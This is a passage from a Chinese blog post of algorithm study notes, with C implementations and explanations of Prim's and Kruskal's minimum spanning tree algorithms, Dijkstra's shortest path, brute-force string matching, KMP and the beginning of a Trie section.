n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">int</span> a, b;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;a, &amp;b);<br>        insert(g, a, b);<br>    &#125;<br>    floodfill(g);<br>    <span class="hljs-built_in">free</span>(g);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="最小生成树">最小生成树</span></h2><p>从一个带权图中抽出一棵生成树，使得边权值和最小，这棵生成树就叫做最小生成树。</p><h3><span id="prim">Prim</span></h3><p>思路很简单，不断寻找距离当前生成树最近的顶点。逐步添加最短边到生成树中。</p><p>定义带权图 <em>G</em> 的顶点集合为<em>V</em>，接着再定义最小生成树的顶点集合为 <em>U</em>，初始集合<em>U</em> 为空。</p><blockquote><ol type="1"><li>任选一个顶点 <span class="math inline">\(x\)</span>，加入集合 <span class="math inline">\(U\)</span>，并记录每个顶点到当前最小生成树的最短距离。</li><li>选择一个距离当前最小生成树最近的，且不属于集合 <span class="math inline">\(U\)</span> 的顶点 <span class="math inline">\(v\)</span>（如果有多个顶点 <span class="math inline">\(v\)</span>，任选其一），将顶点 <span class="math inline">\(v\)</span> 加入集合 <span class="math inline">\(U\)</span>，并更新所有与顶点 <span class="math inline">\(v\)</span>相连的顶点到当前最小生成树的最短距离记录。 3. 重复第二步操作，直至集合<span class="math inline">\(U\)</span> 等于集合 <span class="math inline">\(V\)</span>。</li></ol></blockquote><p>贪心策略，意味着就很直白，没啥难的。</p><p>使用不同的数据结构实现，时间复杂度不同。</p><table><thead><tr class="header"><th></th><th>EXTRACT-MIN</th><th>DECREASE-KEY</th><th>Total</th></tr></thead><tbody><tr class="odd"><td>array</td><td>O(V)</td><td>O(1)</td><td><span class="math inline">\(O(V^2)\)</span></td></tr><tr class="even"><td>binary heap</td><td>O(log V)</td><td>O(log V)</td><td><span class="math inline">\(O(E \log V)\)</span></td></tr><tr class="odd"><td>Fibonacci heap</td><td>O(log V)</td><td>O(1)</td><td><span class="math inline">\(O(E + V\log V)\)</span></td></tr></tbody></table><p>对于稠密图，E达到 <span class="math inline">\(O(V^2)\)</span>级别，使用 Fibonacci heap 实现的Prim算法比较合适。</p><p>下面的实现，起始有点模糊，抽象了一个 <strong>dist</strong>数组。需要到实现过程中才能准确反映出他的意义。一个抽象的解释是，第 i个节点到当前生成树的最小距离（权值最小的那条边的值）。将生成树看作一个整体的话，<strong>dist</strong>数组中的有效值就是<strong>与生成树相连的所有边</strong>的权值。</p><p>通过 <strong>dist</strong>数组，找到下一个生成树节点。然后更新加入新节点之后，新的<strong>dist</strong> 数组。挺抽象的，但是还好，过程很短。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_N 1000</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF = <span class="hljs-number">0x3f3f3f3f</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Graph</span> &#123;</span><br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> visited[MAX_N], dist[MAX_N];<br>    <span class="hljs-keyword">int</span> mat[MAX_N][MAX_N];<br>&#125;Graph;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> input_n)</span> </span>&#123;<br>    g-&gt;n = input_n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; j++) &#123;<br>            g-&gt;mat[i][j] = INF;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> weight)</span> </span>&#123;<br>    g-&gt;mat[x][y] = weight;<br>    g-&gt;mat[y][x] = weight;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prim</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> v)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> total_weight = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        g-&gt;visited[i] = <span class="hljs-number">0</span>;<br>        g-&gt;dist[i] = INF;<br>    &#125;<br>    g-&gt;dist[v] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        <span class="hljs-keyword">int</span> min_dist = INF, min_vertex;<br>        <span class="hljs-comment">// 贪心搜索下一个生成树节点</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (!g-&gt;visited[j] &amp;&amp; g-&gt;dist[j] &lt; min_dist) &#123;<br>                min_dist = g-&gt;dist[j];<br>                min_vertex = j;<br>            &#125;<br>        &#125;<br>        total_weight += min_dist;<br>        g-&gt;visited[min_vertex] = <span class="hljs-number">1</span>;<br>        <br>        <span class="hljs-comment">// 新加入节点后，更新dist数组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (!g-&gt;visited[j] &amp;&amp; g-&gt;mat[min_vertex][j] &lt; g-&gt;dist[j]) &#123;<br>                g-&gt;dist[j] = g-&gt;mat[min_vertex][j];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> total_weight;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    Graph *g = (Graph *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Graph));<br>    init(g, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">int</span> a, b, c;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d %d"</span>, &amp;a, &amp;b ,&amp;c);<br>        insert(g, a, b, c);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, prim(g, <span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">free</span>(g);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实现中很容易发现，存在很多不必要的遍历，每次遍历都是从 0 到n，显然存在优化的空间，以后遇到再说。</p><h3><span id="kruskal">Kruskal</span></h3><p>定义带权图 <em>G</em> 的边集合为<em>E</em>，接着再定义最小生成树的边集合为 <em>T</em>，初始集合<em>T</em> 都为空。</p><blockquote><ol type="1"><li>首先，把图 <span class="math inline">\(G\)</span> 看成一个有 <span class="math inline">\(n\)</span>棵树的森林，图上每个顶点对应一棵树。</li><li>接着，将边集合 <span class="math inline">\(E\)</span>的每条边，按权值从小到大进行排序，</li><li>依次遍历每条边 <span class="math inline">\(e = (u,v)\)</span>，记顶点 <span class="math inline">\(u\)</span> 所在的树为<span class="math inline">\(T_u\)</span>，顶点 <span class="math inline">\(v\)</span> 所在的树为 <span class="math inline">\(T_v\)</span>，如果 <span class="math inline">\(T_u\)</span> 和 <span class="math inline">\(T_v\)</span> 不是同一棵树，则将边 <span class="math inline">\(e\)</span> 加入集合 <span class="math inline">\(T\)</span>，并将两棵树 <span class="math inline">\(T_u\)</span> 和 <span class="math inline">\(T_v\)</span> 进行合并。</li></ol></blockquote><p>算法执行完毕后，集合 <span class="math inline">\(T\)</span>记录了最小生成树的所有边。</p><p>贪心策略，每次都会选择一条<strong>两个顶点不在同一棵树且权值最小的边</strong>加入集合。</p><p>算法包括所有边权值排序和遍历所有边合并树。整体时间复杂度主要看排序部分<span class="math inline">\(O(E\log(E))\)</span>。所以对于结点多但是边少的稀疏图，性能会比Prim算法好。</p><p>实现上，排序使用快速排序，合并验证使用并查集，。</p><h2><span id="最短路径">最短路径</span></h2><p>求一个起点到其余各个顶点的最短路径问题。</p><h3><span id="dijkstra">Dijkstra</span></h3><p>定义带权图 <em>G</em> 所有顶点的集合为<em>V</em>，接着再定义已确定最短路径的顶点集合为 <em>U</em>，初始集合<em>U</em> 为空。</p><blockquote><ol type="1"><li>首先将起点 <span class="math inline">\(x\)</span> 加入集合 <span class="math inline">\(U\)</span>，并在数组 <span class="math inline">\(A\)</span> 中记录起点 <span class="math inline">\(x\)</span> 到各个点的最短路径（如果顶点到起点<span class="math inline">\(x\)</span>有直接相连的边，则最短路径为边权值，否则为一个极大值）。</li><li>从数组 <span class="math inline">\(A\)</span> 中选择一个距离起点<span class="math inline">\(x\)</span> 最近的，且不属于集合 <span class="math inline">\(U\)</span> 的顶点 <span class="math inline">\(v\)</span>（如果有多个顶点 <span class="math inline">\(v\)</span>，任选其一即可），将顶点 <span class="math inline">\(v\)</span> 加入集合 <span class="math inline">\(U\)</span>，并更新所有与顶点 <span class="math inline">\(v\)</span> 相连的顶点到起点 <span class="math inline">\(x\)</span> 的最短路径。</li><li>重复第二步操作，直至集合 <span class="math inline">\(U\)</span>等于集合 <span class="math inline">\(V\)</span>。</li></ol></blockquote><p>算法结束，数组 <span class="math inline">\(A\)</span> 记录了起点<span class="math inline">\(x\)</span> 到其余 <span class="math inline">\(n - 1\)</span> 个点的最短路径。</p><p>和Prim很类似，差别在于比较大小的目标是距离起点 x的距离。同时算法不能处理有负权边的问题（这是BellmanFord这类算法解决的问题）。</p><p>时间复杂度和Prim类似，在是使用 Fibonacci heap 优化后，为<span class="math inline">\(O(E + V\log V)\)</span>。</p><p>算法的关键就是更新当前最优结点的相邻结点的最短路径。（真的不喜欢贪心这个词，每次找到最值怎么就贪心了？贪心是已经得到最好，但是还是不满足的。）</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_N 1000</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF = <span class="hljs-number">0x3f3f3f3f</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Graph</span> &#123;</span><br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> visited[MAX_N], dist[MAX_N];<br>    <span class="hljs-keyword">int</span> mat[MAX_N][MAX_N];<br>&#125;Graph;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> input_n)</span> </span>&#123;<br>    g-&gt;n = input_n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; j++) &#123;<br>            g-&gt;mat[i][j] = INF;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> weight)</span> </span>&#123;<br>    g-&gt;mat[x][y] = weight;<br>    g-&gt;mat[y][x] = weight;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> v)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        g-&gt;visited[i] = <span class="hljs-number">0</span>;<br>        g-&gt;dist[i] = INF;<br>    &#125;<br>    g-&gt;dist[v] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        <span class="hljs-keyword">int</span> min_d = INF, min_i;<br>        <span class="hljs-comment">// i结点当前到起点的最短路径</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (!g-&gt;visited[j] &amp;&amp; g-&gt;dist[j] &lt; min_d) &#123;<br>                min_d = g-&gt;dist[j];<br>                min_i = j;<br>            &#125;         <br>        &#125;<br>        g-&gt;visited[min_i] = <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 从已知最短路径的结点开始，计算相邻结点到起点的最短路径是否需要更新</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; g-&gt;n; k++) &#123;<br>            <span class="hljs-keyword">if</span> (!g-&gt;visited[k] &amp;&amp; g-&gt;mat[min_i][k] + min_d &lt; g-&gt;dist[k]) &#123;<br>                g-&gt;dist[k] = g-&gt;mat[min_i][k] + min_d;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    Graph *g = (Graph *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Graph));<br>    init(g, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">int</span> a, b, c;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d %d"</span>, &amp;a, &amp;b ,&amp;c);<br>        insert(g, a, b, c);<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> v;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;v);<br><br>    dijkstra(g, v);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d: %d\n"</span>, i, g-&gt;dist[i]);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(g);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="字符串匹配">字符串匹配</span></h2><p>这部分之前整理过，<a href="https://racleray.space/posts/51024bbf.html#">字符串匹配从KMP到AC自动机</a>。但是这个东西就是容易忘。</p><p>基础的暴力搜索方法就不谈了，没啥可记的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXLEN 1024</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">match</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">char</span> *pattern)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">buffer</span>) - <span class="hljs-built_in">strlen</span>(pattern) + <span class="hljs-number">1</span>; ++i) &#123;<br>        <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (; j &lt; <span class="hljs-built_in">strlen</span>(pattern); ++j) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">buffer</span>[i + j] != pattern[j]) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (j == <span class="hljs-built_in">strlen</span>(pattern)) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[MAXLEN], pattern[MAXLEN];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s%s"</span>, <span class="hljs-built_in">buffer</span>, pattern);<br>    <span class="hljs-keyword">int</span> location = match(<span class="hljs-built_in">buffer</span>, pattern);<br>    <span class="hljs-keyword">if</span> (location != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"match success, location is %d\n"</span>, location);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"match failed!\n"</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>注意 i &lt; strlen(buffer) - strlen(pattern) + 1，其中 + 1才表示最后一段 pattern 长度的字符的起点index。</p><h3><span id="kmp">KMP</span></h3><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">S:</span> aaaaaababaaaaa<br><span class="hljs-symbol">W:</span> ababc<br></code></pre></div></td></tr></table></figure><p>上例，abab匹配，c不匹配。暴力搜索会直接退回4个位置，从S中a的下一个b开始重新匹配W。</p><p>KMP的思想就是，不回退4，而是利用已经匹配过的字符，找到可以直接跳过，并且一定和W的一部分匹配的位置。比如上例中，第一次abab匹配，c不匹配，那么此时，根据W的规律，S中必然出现了abab。此时可以跳过S中a之后的第一个b，从第二个ab之后的位置开始匹配W的第一个ab之后的部分。</p><p>KMP就是分析W的规律，找到当每一个位置字符出现不匹配时，下一次匹配可以高效跳过的部分。</p><p>建立一个 Next 数组，记录在 W中，拥有相同前缀的子串中最后一个字符的index值。就是下一次匹配开始的位置。注意其中一个子串是从W 的第一个字符开始的，另一个字串位于 W 中间部分。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_LEN 100010</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_next</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *pat, <span class="hljs-keyword">int</span> *next)</span> </span>&#123;<br>    next[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(pat); ++i) &#123;<br>        <span class="hljs-comment">// j - 1 代表已经成功匹配的最后一个位置的index，j为待匹配的第一个位置</span><br>        <span class="hljs-keyword">while</span> (j &amp;&amp; pat[j] != pat[i]) &#123;<br>            j = next[j - <span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">if</span> (pat[j] == pat[i]) &#123;<br>            j++;<br>        &#125;<br>        next[i] = j;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">char</span> *pat, <span class="hljs-keyword">int</span> *next)</span> </span>&#123;<br>    <span class="hljs-comment">// j 代表j - 1 及之前的部分已经匹配，匹配成功会等于 pat 的长度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">buffer</span>); ++i) &#123;<br>        <span class="hljs-keyword">while</span> (j &amp;&amp; pat[j] != <span class="hljs-built_in">buffer</span>[i]) &#123;<br>            j = next[j - <span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">if</span> (pat[j] == <span class="hljs-built_in">buffer</span>[i]) &#123;<br>            j++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (j == <span class="hljs-built_in">strlen</span>(pat)) &#123;<br>            <span class="hljs-keyword">return</span> i - j + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[MAX_LEN], pattern[MAX_LEN];<br>    <span class="hljs-keyword">int</span> next[MAX_LEN];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s%s"</span>, <span class="hljs-built_in">buffer</span>, pattern);<br>    get_next(pattern, next);<br>    <span class="hljs-keyword">int</span> location = <span class="hljs-built_in">find</span>(<span class="hljs-built_in">buffer</span>, pattern, next);<br>    <br>    <span class="hljs-keyword">if</span> (location == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"No\n"</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Yes\n%d\n"</span>, location);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="trie">Trie</span></h3><p>多个模式字符串前缀树，处理一个输入串从多个模式字符串中进行匹配前缀的情况。</p><p>Trie 树有以下特点：</p><blockquote><ol type="1"><li>Trie 树的根结点上不存储字符，其余结点上存且只存一个字符。</li><li>从根结点出发，到某一结点上经过的字符，即是该结点对应的前缀。</li><li>每个结点的孩子结点存储的字符各不相同。</li><li>Trie树牺牲空间来换取时间，当数据量很大时，会占用很大空间。如果字符串均由小写字母组成，则每个结点最多会有<span class="math inline">\(26\)</span> 个孩子结点，则最多会有 <span class="math inline">\(26^n\)</span> 个用于存储的结点，<span class="math inline">\(n\)</span> 为字符串的最大长度。</li></ol></blockquote><p>Trie树常用于字符串的快速检索，字符串的快速排序与去重，文本的词频统计等。查询效率对于长度为n 的输入串，时间复杂为 O(n)。</p><p>下面程序利用Trie计算一段输入串 S 中不重复的字串个数。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs 